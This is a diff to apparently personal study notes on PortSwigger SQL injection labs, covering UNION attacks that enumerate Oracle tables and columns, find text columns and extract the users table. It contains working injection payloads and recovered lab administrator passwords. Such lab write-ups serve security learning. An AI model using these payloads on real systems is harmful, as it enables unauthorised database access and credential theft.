@@ -750,12 +750,64 @@ note: On Oracle databases, every `SELECT` statement must specify a table to sele
 
 `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
 
-<image>
+![image-20250525162423964](./image/image-20250525162423964.png)
+
+
 
 - get column name:
 
-`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
+`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XRVGVT'--`
+
+![image-20250525162623470](./image/image-20250525162623470.png)
 
 - get creds:
 
-`'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
+`'+UNION+SELECT+USERNAME_IYJADB,+PASSWORD_PFYFJL+FROM+USERS_XRVGVT--`
+
+![image-20250525162721831](./image/image-20250525162721831.png)
+
+administrator:jvja6if7qlajwx9p5mv6
+
+![image-20250525162835615](./image/image-20250525162835615.png)
+
+### [Lab 7: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
+
+- Verify that the query is returning three columns, using the following payload in the `category` parameter:
+
+```
+'+UNION+SELECT+NULL,NULL,NULL--
+```
+
+![image-20250525165346942](./image/image-20250525165346942.png)
+
+- Try replacing each null with the random value provided by the lab, for example:
+
+```
+'+UNION+SELECT+'nbAuwj',NULL,NULL--
+```
+
+- If an error occurs, move on to the next null and try that instead.
+
+![image-20250525165756879](./image/image-20250525165756879.png)
+
+![image-20250525165822572](./image/image-20250525165822572.png)
+
+### [Lab 8: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+
+1. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+
+   ```
+   '+UNION+SELECT+'abc','def'--
+   ```
+
+2. Use the following payload to retrieve the contents of the `users` table:
+
+   ```
+   '+UNION+SELECT+username,password+FROM+users--
+   ```
+
+![image-20250525194036090](./image/image-20250525194036090.png)
+
+**administrator:wqfnnzd20pwxgsby82av**
+
+![image-20250525194137387](./image/image-20250525194137387.png)
